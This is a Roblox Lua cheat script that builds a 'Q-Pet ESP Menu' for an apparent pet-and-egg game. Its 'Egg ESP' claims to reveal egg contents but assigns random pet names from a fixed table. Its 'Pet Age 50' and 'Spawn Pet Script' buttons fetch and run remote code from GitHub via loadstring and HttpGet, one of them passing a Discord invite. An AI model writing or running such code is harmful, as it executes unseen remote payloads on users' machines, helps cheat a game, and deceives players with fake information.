local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local player = Players.LocalPlayer
local mouse = player:GetMouse()

local petTable = {
    ["Common Egg"] = { "Dog", "Bunny", "Golden Lab" },
    ["Uncommon Egg"] = { "Cat", "Red Fox", "Bat" },
    ["Rare Egg"] = { "Tiger", "Fire Cat", "Icy Bat" },
    ["Zen Egg"] = { "Tanchozuru", "Kappa", "Kitsune", "Tanuki", "NihonZaru" },
    ["Mutation Egg"] = { "Weird Fox", "Double Dog", "Cursed Eye" }
}

local function createESP(target, text)
    if target:FindFirstChild("ESPLabel") then return end
    local billboard = Instance.new("BillboardGui", target)
    billboard.Name = "ESPLabel"
    billboard.Adornee = target:FindFirstChildWhichIsA("BasePart")
    billboard.Size = UDim2.new(0, 100, 0, 40)
    billboard.AlwaysOnTop = true

    local label = Instance.new("TextLabel", billboard)
    label.Size = UDim2.new(1, 0, 1, 0)
    label.BackgroundTransparency = 1
    label.TextColor3 = Color3.fromRGB(255, 255, 255)
    label.TextStrokeTransparency = 0.3
    label.Font = Enum.Font.GothamBold
    label.TextScaled = true
    label.Text = text
end

local function randomizeEggs()
    for _, egg in pairs(Workspace:GetDescendants()) do
        if egg:IsA("Model") and petTable[egg.Name] and not egg:FindFirstChild("ESPLabel") then
            local petList = petTable[egg.Name]
            local petName = petList[math.random(1, #petList)]
            createESP(egg, egg.Name .. "\n🧬 " .. petName)
        end
    end
end

local function mutationESP()
    for _, egg in pairs(Workspace:GetDescendants()) do
        if egg:IsA("Model") and egg.Name == "Mutation Egg" and not egg:FindFirstChild("ESPLabel") then
            createESP(egg, "Mutation Egg")
        end
    end
end

-- 🆕 Pet Age 50
local function loadAge50()
    local success, err = pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/GrowAGarden-Scr1pt/scripts/refs/heads/main/Qloader.lua", true))()
    end)

    -- Fallback if GitHub file fails
    if not success then
        for _, obj in pairs(Workspace:GetDescendants()) do
            if obj:IsA("IntValue") and obj.Name == "Age" then
                obj.Value = 50
            end
        end
    end
end

-- GUI Setup
local screenGui = Instance.new("ScreenGui", game.CoreGui)
screenGui.Name = "PetGui"

local frame = Instance.new("Frame", screenGui)
frame.Size = UDim2.new(0, 220, 0, 230)
frame.Position = UDim2.new(0.5, -110, 0.5, -115)
frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = true

local title = Instance.new("TextLabel", frame)
title.Size = UDim2.new(1, 0, 0, 30)
title.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
title.Text = "🐾 Q-Pet ESP Menu"
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.Font = Enum.Font.FredokaOne
title.TextSize = 18

-- 🟨 Minimize Toggle Button
local toggleBtn = Instance.new("TextButton", frame)
toggleBtn.Size = UDim2.new(0, 30, 0, 30)
toggleBtn.Position = UDim2.new(1, -30, 0, 0)
toggleBtn.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
toggleBtn.Text = "-"
toggleBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
toggleBtn.Font = Enum.Font.FredokaOne
toggleBtn.TextSize = 18
toggleBtn.ZIndex = 2

local minimized = false
toggleBtn.MouseButton1Click:Connect(function()
    minimized = not minimized
    toggleBtn.Text = minimized and "+" or "-"
    for _, child in ipairs(frame:GetChildren()) do
        if child:IsA("TextButton") and child ~= toggleBtn then
            child.Visible = not minimized
        end
    end
end)

-- UI Buttons
local eggBtn = Instance.new("TextButton", frame)
eggBtn.Size = UDim2.new(1, -20, 0, 30)
eggBtn.Position = UDim2.new(0, 10, 0, 40)
eggBtn.BackgroundColor3 = Color3.fromRGB(100, 100, 250)
eggBtn.Text = "🥚 Egg ESP"
eggBtn.TextSize = 16
eggBtn.Font = Enum.Font.FredokaOne
eggBtn.TextColor3 = Color3.fromRGB(255, 255, 255)

local mutationBtn = Instance.new("TextButton", frame)
mutationBtn.Size = UDim2.new(1, -20, 0, 30)
mutationBtn.Position = UDim2.new(0, 10, 0, 80)
mutationBtn.BackgroundColor3 = Color3.fromRGB(180, 85, 200)
mutationBtn.Text = "🧬 Mutation ESP"
mutationBtn.TextSize = 16
mutationBtn.Font = Enum.Font.FredokaOne
mutationBtn.TextColor3 = Color3.fromRGB(255, 255, 255)

local ageBtn = Instance.new("TextButton", frame)
ageBtn.Size = UDim2.new(1, -20, 0, 30)
ageBtn.Position = UDim2.new(0, 10, 0, 120)
ageBtn.BackgroundColor3 = Color3.fromRGB(85, 200, 120)
ageBtn.Text = "⏳ Pet Age 50"
ageBtn.TextSize = 16
ageBtn.Font = Enum.Font.FredokaOne
ageBtn.TextColor3 = Color3.fromRGB(255, 255, 255)

local spawnBtn = Instance.new("TextButton", frame)
spawnBtn.Size = UDim2.new(1, -20, 0, 30)
spawnBtn.Position = UDim2.new(0, 10, 0, 160)
spawnBtn.BackgroundColor3 = Color3.fromRGB(120, 200, 100)
spawnBtn.Text = "🐶 Spawn Pet Script"
spawnBtn.TextSize = 16
spawnBtn.Font = Enum.Font.FredokaOne
spawnBtn.TextColor3 = Color3.fromRGB(255, 255, 255)

spawnBtn.MouseButton1Click:Connect(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/veryimportantrr/x/refs/heads/main/gag_visual.lua", true))("discord.gg/csxu2nCkw9")
end)

local closeBtn = Instance.new("TextButton", frame)
closeBtn.Size = UDim2.new(1, -20, 0, 30)
closeBtn.Position = UDim2.new(0, 10, 0, 200)
closeBtn.BackgroundColor3 = Color3.fromRGB(255, 80, 80)
closeBtn.Text = "❌ Close GUI"
closeBtn.TextSize = 16
closeBtn.Font = Enum.Font.FredokaOne
closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)

-- Button Connections
eggBtn.MouseButton1Click:Connect(randomizeEggs)
mutationBtn.MouseButton1Click:Connect(mutationESP)
ageBtn.MouseButton1Click:Connect(loadAge50)
closeBtn.MouseButton1Click:Connect(function() screenGui:Destroy() end)
